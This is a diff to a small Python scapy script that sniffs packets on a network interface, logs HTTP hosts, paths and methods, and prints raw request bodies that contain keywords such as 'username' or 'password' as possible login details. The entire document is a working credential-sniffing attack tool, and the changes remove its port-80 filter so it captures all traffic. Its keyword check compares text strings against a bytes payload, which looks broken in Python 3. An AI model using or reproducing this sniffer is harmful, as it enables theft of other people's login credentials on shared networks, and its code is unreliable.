@@ -14,25 +14,28 @@ def options():
 
 
 def sniffer(interface):
-    scapy.sniff(filter='port 80',iface=interface, store=False, prn=processer)
+    scapy.sniff(iface=interface, store=False, prn=processer)
+
+def get_url(packet):
+    return packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+
+def get_login(packet):
+    if packet.haslayer(scapy.Raw):
+        load= packet[scapy.Raw].load
+        keys= ['username','user','login','password','pass']
+        for key in keys:
+            if key in load:
+                return load
 
 def processer(packet):
     if packet.haslayer(HTTPRequest):
-        url=packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        url=get_url(packet)
         #ip = packet[IP].src.decode()
         method = packet[HTTPRequest].Method.decode()
-        print(f">>{url} with {method}")
-        if packet.haslayer(scapy.Raw):
-            load= packet[scapy.Raw].load
-            keys= ['username','user','login','password','pass']
-            for key in keys:
-                if key in load:
-                    print(load)
-                    break
+        print(f">>HTTP request:{url} with {method} method\n")
+        login=get_login(packet)
+        if login:
+            print(f'\nPossible login details {login}')
 
 options=options()
-try:
-    sniffer(options.interface)
-except KeyboardInterrupt:
-    print('User requested termination.\nHASTA LA VISTA......')
-    sys.exit()
+sniffer(options.interface)
